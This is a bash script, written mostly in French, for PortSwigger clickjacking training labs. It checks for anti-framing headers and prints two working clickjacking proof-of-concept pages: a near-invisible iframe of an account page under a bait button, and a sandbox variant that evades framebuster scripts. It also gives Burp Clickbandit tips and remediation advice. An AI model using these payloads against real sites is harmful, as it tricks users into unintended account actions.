#!/bin/bash

# PortSwigger Clickjacking Challenges - Automated Bash Script with Functions and Suggestions
# Usage: Edit the variables below with your target URLs.

# --------- Configuration (edit these values) ---------
TARGET_URL="https://<your-lab>.web-security-academy.net/my-account"
# -----------------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Test for missing anti-clickjacking headers
test_headers() {
    print_sep
    echo "[1] Test de présence des headers anti-clickjacking"
    headers=$(curl -skI "$TARGET_URL")
    echo "$headers"
    if ! echo "$headers" | grep -qi "x-frame-options"; then
        echo ">> [ALERTE] Header X-Frame-Options absent !"
        echo ">> PROPOSITION : Ajouter X-Frame-Options: DENY ou SAMEORIGIN côté serveur."
    else
        echo "Header X-Frame-Options présent."
    fi
    if ! echo "$headers" | grep -qi "content-security-policy"; then
        echo ">> [ALERTE] Header Content-Security-Policy absent !"
        echo ">> PROPOSITION : Ajouter une directive CSP frame-ancestors pour restreindre l'embarquement en iframe."
    else
        echo "Header Content-Security-Policy présent."
    fi
}

# 2. Génération d'une preuve de concept HTML pour clickjacking
generate_poc() {
    print_sep
    echo "[2] Génération d'une preuve de concept HTML pour clickjacking"
    echo "Copiez ce code sur un serveur d'exploit ou en local, puis ouvrez-le dans un navigateur :"
    cat <<EOF
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    #target-iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 800px;
      height: 600px;
      opacity: 0.1;
      z-index: 2;
      border: none;
    }
    #bait {
      position: absolute;
      top: 50px;
      left: 50px;
      z-index: 3;
      background: #fff;
      padding: 20px;
      font-size: 24px;
      border: 2px solid #000;
    }
  </style>
</head>
<body>
  <div id="bait">Cliquez ici pour gagner !</div>
  <iframe id="target-iframe" src="$TARGET_URL"></iframe>
</body>
</html>
EOF
    echo
    echo ">> [INFO] Si la page cible s'affiche dans l'iframe, la protection anti-clickjacking est absente ou contournable."
    echo ">> PROPOSITION : Implémenter X-Frame-Options et CSP frame-ancestors."
}

# 3. Test de contournement avec sandbox (pour framebuster)
test_sandbox_bypass() {
    print_sep
    echo "[3] Génération d'une PoC avec sandbox (bypass de framebuster possible)"
    echo "Utilisez ce code si la page cible utilise une framebuster JS :"
    cat <<EOF
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC - Sandbox Bypass</title>
  <style>
    #target-iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 800px;
      height: 600px;
      opacity: 0.1;
      z-index: 2;
      border: none;
    }
    #bait {
      position: absolute;
      top: 50px;
      left: 50px;
      z-index: 3;
      background: #fff;
      padding: 20px;
      font-size: 24px;
      border: 2px solid #000;
    }
  </style>
</head>
<body>
  <div id="bait">Cliquez ici pour gagner !</div>
  <iframe id="target-iframe" sandbox="allow-forms allow-scripts" src="$TARGET_URL"></iframe>
</body>
</html>
EOF
    echo
    echo ">> [INFO] Le paramètre sandbox peut contourner certains scripts framebuster."
    echo ">> PROPOSITION : Utiliser des headers serveur, pas du JS, pour empêcher l'embarquement en iframe."
}

# 4. Conseils pour l'exploitation avancée (Burp Clickbandit)
clickbandit_info() {
    print_sep
    echo "[4] Exploitation avancée avec Burp Clickbandit"
    echo "- Ouvrez Burp Suite, menu Burp > Burp Clickbandit."
    echo "- Copiez le script Clickbandit dans le presse-papier."
    echo "- Collez-le dans la console développeur de votre navigateur sur la page cible."
    echo "- Utilisez Clickbandit pour enregistrer et rejouer des scénarios de clickjacking complexes."
    echo "Voir documentation : https://portswigger.net/burp/documentation/desktop/tools/clickbandit"
}

# Main script execution
echo "=== PortSwigger Clickjacking Automated Checks ==="
test_headers
generate_poc
test_sandbox_bypass
clickbandit_info

print_sep
echo "[SYNTHÈSE]"
echo "1. Vérifiez la présence des headers X-Frame-Options et Content-Security-Policy."
echo "2. Testez l'affichage de la page cible dans un iframe avec la PoC générée."
echo "3. Essayez le bypass sandbox si un framebuster JS est présent."
echo "4. Utilisez Burp Clickbandit pour des scénarios avancés."
echo "Documentation PortSwigger : https://portswigger.net/web-security/clickjacking"
print_sep

# End of script
